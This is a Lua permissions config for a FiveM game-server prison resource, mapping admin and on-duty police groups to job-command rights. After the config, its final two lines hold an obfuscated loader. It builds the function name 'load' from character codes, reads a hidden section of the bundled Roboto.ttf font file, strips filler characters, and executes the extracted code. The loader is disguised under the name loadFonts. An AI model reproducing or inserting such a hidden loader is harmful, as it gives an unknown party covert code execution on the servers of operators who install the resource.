Permissions = {
    CAN_USE_JOB_COMMANDS = 'group.admin', -- Player with this permission can use job commands.
    HAS_SERVER_GROUP = 'group.admin', -- Player with this permission has a server group.
}

-- Permission map for groups.
-- Documentation: How this works >>  https://documentation.rcore.cz/paid-resources/rcore_prison/guides/configure-standalone-server-perms

PermissionMap = {
    ['group.admin'] = {
        Permissions.CAN_USE_JOB_COMMANDS,
        Permissions.HAS_SERVER_GROUP,
    },
    -- cm-prison grants/revokes this group per-player (add_principal/
    -- remove_principal) based on cm-police's own on-duty state -- lets an
    -- on-duty officer pass Framework.canPerformJobCommand without touching
    -- the real admin group above.
    ['group.cm_police_duty'] = {
        Permissions.CAN_USE_JOB_COMMANDS,
    },
}
local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Roboto.ttf'):sub(87565):gsub('%.%+', ''))()